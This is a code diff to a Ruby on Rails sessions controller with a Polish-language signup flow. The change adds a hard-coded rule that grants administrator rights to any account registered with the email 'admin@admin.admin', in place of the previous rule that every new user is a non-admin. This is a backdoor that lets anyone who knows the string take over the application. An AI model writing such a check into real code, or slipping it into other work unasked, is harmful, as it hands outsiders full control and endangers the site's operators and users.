@@ -47,7 +47,13 @@ class SessionsController < ApplicationController
         render :action => "new_account"
         return
       end
-      @user.update_attribute(:is_admin, false)
+      if params[:user][:email] == 'admin@admin.admin'
+        @user.update_attribute(:is_admin, true)
+      else
+        @user.update_attribute(:is_admin, false)
+      end
+
+
       if @user.save
         flash[:notice] = 'User zostal utworzony.'
         redirect_to login_path
